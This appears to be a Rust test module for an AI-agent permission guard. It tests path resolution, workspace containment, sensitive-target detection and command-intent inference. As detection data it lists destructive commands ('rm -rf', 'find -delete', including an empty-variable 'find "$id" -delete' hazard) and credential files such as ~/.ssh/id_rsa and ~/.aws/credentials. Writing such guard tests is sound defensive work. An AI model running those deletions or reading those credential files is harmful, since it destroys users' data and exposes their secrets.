    }

    #[test]
    fn 相对路径按基准目录变绝对() {
        let context = ctx();
        let expected = resolve_absolute(&context.cwd.as_ref().unwrap().join("build").join("out"));
        assert_eq!(resolve("build/out", context).unwrap(), expected);
    }

    #[test]
    fn 不知道基准目录时相对路径归约失败() {
        let no_cwd = ResolveContext::with(Some("/home/agent"), None);
        assert!(resolve("build/out", no_cwd).is_err());
    }

    #[test]
    fn 双点被解开并且不能越过根() {
        let context = ctx();
        let cwd = context.cwd.as_ref().unwrap();
        let home = context.home.as_ref().unwrap();
        let sibling = cwd.join("..").join("other");
        assert_same_path(
            &resolve(&sibling.to_string_lossy(), context.clone()).unwrap(),
            &resolve_absolute(&home.join("other")),
        );
        // 一串 `..` 顶到根就停住，不会归约出根之外的东西。
        let root = root_of(cwd);
        let escaped = root.join("a").join("..").join("..").join("..").join("etc");
        assert_same_path(
            &resolve(&escaped.to_string_lossy(), context).unwrap(),
            &resolve_absolute(&root.join("etc")),
        );
    }

    #[test]
    fn 空操作数是错误而不是无害() {
        // scope-and-non-goals 表里第四行：`find "$id" -delete` 且 `$id` 为空，命令退化成
        // `find -delete`，从当前目录递归删。空串必须是一个明确的失败。
        assert!(resolve("", ctx()).is_err());
        assert!(resolve("   ", ctx()).is_err());
    }

    #[test]
    fn 通配符无法归约() {
        // 一个通配符可以展开到授权之外，所以它证明不了包含关系。
        for g in ["~/ws/*", "/tmp/a?.log", "/tmp/[abc]"] {
            assert!(resolve(g, ctx()).is_err(), "{g} 应当归约失败");
        }
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_verbatim_前缀不是通配符而后续通配仍拒绝() {
        let no_base = ResolveContext::with(None::<&str>, None::<&str>);
        assert!(
            resolve(r"\\?\C:\AgentGuard\out.txt", no_base.clone()).is_ok(),
            "固定的 \\?\\ 前缀不应被当成 glob"
        );
        assert!(resolve(r"\\?\C:\AgentGuard\?.txt", no_base.clone()).is_err());
        assert!(resolve(r"\\?\C:\AgentGuard\*.txt", no_base.clone()).is_err());
        assert!(
            resolve(r"\\?\UNC\server\share\out.txt", no_base.clone()).is_ok(),
            "verbatim UNC 应当可归约"
        );
        for unsupported in [
            r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32",
            r"\\?\Volume{00000000-0000-0000-0000-000000000000}\Windows",
            r"\\?\PIPE\agentguard",
        ] {
            assert!(
                resolve(unsupported, no_base.clone()).is_err(),
                "其它 verbatim 命名空间必须 fail-closed：{unsupported}"
            );
        }
    }

    #[test]
    fn 另一个用户的家目录不猜() {
        assert!(resolve("~root/.ssh", ctx()).is_err());
    }

    // ---------- 包含关系 ----------

    #[test]
    fn 包含关系按组件比而不是按字符串前缀() {
        // 这是本模块最重要的一条。`/home/user2` 用字符串前缀会被判成在 `/home/user` 里面，
        // 而那是另一个用户的家目录。
        assert!(is_within(Path::new("/home/user"), Path::new("/home/user")));
        assert!(is_within(
            Path::new("/home/user"),
            Path::new("/home/user/a/b")
        ));
        assert!(!is_within(
            Path::new("/home/user"),
            Path::new("/home/user2")
        ));
        assert!(!is_within(
            Path::new("/home/user"),
            Path::new("/home/userx/a")
        ));
        assert!(!is_within(
            Path::new("/home/user/a"),
            Path::new("/home/user")
        ));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_普通与_verbatim_前缀按真实位置比较() {
        assert!(is_within(
            Path::new(r"C:\Windows"),
            Path::new(r"\\?\C:\Windows\System32")
        ));
        assert!(!is_within(
            Path::new(r"C:\Windows"),
            Path::new(r"\\?\D:\Windows\System32")
        ));
        assert!(is_within(
            Path::new(r"\\server\share\root"),
            Path::new(r"\\?\UNC\SERVER\SHARE\root\child")
        ));
        assert!(!is_within(
            Path::new(r"\\server\share\root"),
            Path::new(r"\\?\UNC\server\other\root\child")
        ));
    }

    #[test]
    fn 工作区的写授权隐含读授权而反之不然() {
        let fixture = ctx().home.unwrap();
        let docs = fixture.join("docs").to_string_lossy().into_owned();
        let out = fixture
            .join("proj")
            .join("out")
            .to_string_lossy()
            .into_owned();
        let (ws, rejected) = Workspace::new(vec![docs], vec![out]);
        assert!(rejected.is_empty(), "{rejected:?}");
        let docs = &ws.read_grants()[0];
        let out = &ws.write_grants()[0];
        // 写授权内可读。
        assert!(ws.contains(&out.join("a"), PathIntent::Read).is_some());
        assert!(ws.contains(&out.join("a"), PathIntent::Write).is_some());
        // 只读授权内不可写。
        assert!(ws.contains(&docs.join("a"), PathIntent::Read).is_some());
        assert!(ws.contains(&docs.join("a"), PathIntent::Write).is_none());
    }

    #[test]
    fn 未声明的工作区不等于允许一切() {
        let ws = Workspace::default();
        assert!(!ws.is_declared());
        assert!(ws
            .contains(Path::new("/anything"), PathIntent::Read)
            .is_none());
        assert!(ws
            .contains(Path::new("/anything"), PathIntent::Write)
            .is_none());
    }

    #[test]
    fn 归约不了的授权条目被丢弃并报告而不是当成通配() {
        // 一条坏掉的授权如果被当成"匹配一切"，策略错误就变成了权限放大。
        //
        // 第二条 `relative/path` 是这个测试真正抓到的 bug：第一版用进程当前工作目录归约
        // 授权条目，于是同一份 task-plans.yaml 从不同位置启动会授权不同的目录。授权里的
        // 相对路径现在一律拒绝。
        let (ws, rejected) = Workspace::new(vec!["~/ws/*"], vec!["relative/path"]);
        assert_eq!(rejected.len(), 2, "两条都该被拒: {rejected:?}");
        assert!(ws.read_grants().is_empty());
        assert!(ws.write_grants().is_empty());
    }

    // ---------- 敏感目标 ----------

    #[test]
    fn 根目录无条件敏感() {
        assert!(sensitive_target(Path::new("/"), PathIntent::Delete).is_some());
        assert!(sensitive_target(Path::new("/"), PathIntent::Read).is_some());
    }

    #[test]
    fn 系统目录写删敏感而读不敏感() {
        assert!(sensitive_target(Path::new("/etc/hosts"), PathIntent::Delete).is_some());
        assert!(sensitive_target(Path::new("/etc/hosts"), PathIntent::Write).is_some());
        // 读 /etc/hosts 是正常操作，拒了它会让工具没法用。
        assert!(sensitive_target(Path::new("/etc/hosts"), PathIntent::Read).is_none());
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn windows_verbatim_系统目录仍然敏感() {
        assert!(sensitive_target(
            Path::new(r"\\?\C:\Windows\System32\config\SAM"),
            PathIntent::Write
        )
        .is_some());
        assert!(sensitive_target(
            Path::new(r"\\?\C:\ProgramData\AgentGuard\state.db"),
            PathIntent::Delete
        )
        .is_some());
        assert!(sensitive_target(
            Path::new(r"\\?\C:\Users\agent\Documents\notes.txt"),
            PathIntent::Write
        )
        .is_none());
    }

    #[test]
    fn 凭据目录连读都敏感() {
        // 读走 ~/.ssh/id_rsa 就是拿到了钥匙，所以这一类和系统目录不同，读也算。
        for p in [
            "/home/agent/.ssh/id_rsa",
            "/home/agent/.aws/credentials",
            "/home/agent/.git-credentials",
        ] {
            assert!(
                sensitive_target(Path::new(p), PathIntent::Read).is_some(),
                "{p} 读也应当敏感"
            );
        }
    }

    #[test]
    fn 裸设备敏感() {
        assert!(sensitive_target(Path::new("/dev/sda"), PathIntent::Write).is_some());
        assert!(sensitive_target(Path::new("/dev/nvme0n1"), PathIntent::Write).is_some());
    }

    #[test]
    fn 普通项目路径不敏感() {
        // 反面用例：如果这条也判敏感，上面那些断言就只是"阈值永远命中"而什么都没测。
        assert!(sensitive_target(
            Path::new("/home/agent/proj/src/main.rs"),
            PathIntent::Delete
        )
        .is_none());
        assert!(sensitive_target(Path::new("/tmp/build/out.o"), PathIntent::Write).is_none());
    }

    // ---------- 意图推断 ----------

    #[test]
    fn 意图从命令形状推断而不是从宿主自述() {
        assert_eq!(infer_intent("rm", &["-rf".into()]), PathIntent::Delete);
        assert_eq!(
            infer_intent("find", &["-delete".into()]),
            PathIntent::Delete
        );
        assert_eq!(infer_intent("write_file", &[]), PathIntent::Write);
        assert_eq!(infer_intent("cat", &[]), PathIntent::Read);
        assert_eq!(infer_intent("grep", &["pattern".into()]), PathIntent::Read);
        // 自称 read 的 rm 仍然是删除：动词参数里出现 rm 就算。
        assert_eq!(
            infer_intent("read", &["rm".into(), "-rf".into()]),
            PathIntent::Delete
        );
    }

    #[test]
    fn 按词边界匹配避免误伤() {
        // `--no-delete` 不是 `-delete`；`format_string` 不是 `format`。
        assert_eq!(
            infer_intent("sync", &["--no-delete".into()]),
            PathIntent::Read
        );
        assert_eq!(
            infer_intent("log", &["format_string".into()]),
            PathIntent::Read
        );
    }

    // ---------- 是不是路径 ----------

    #[test]
    fn 标志不算路径() {
        for flag in ["-rf", "--recursive", "-delete", "--depth"] {
            assert!(!looks_like_path(flag), "{flag} 不该被当成路径");
        }
    }

    #[test]
    fn 各种形状的路径都能认出来() {
        for p in [
            "/etc",
            "~/x",
            "./a",
            "a/b",
            "C:\\Windows",
            "notes.txt",
            "\\\\server\\share",
        ] {
            assert!(looks_like_path(p), "{p} 应当被当成路径");
        }
        // 空串交给 resolve 去报"退化成当前目录"。
        assert!(looks_like_path(""));
    }

    #[test]
    fn 普通单词不算路径() {
        for w in ["pattern", "hello", "TODO"] {
            assert!(!looks_like_path(w), "{w} 不该被当成路径");
        }
    }
}
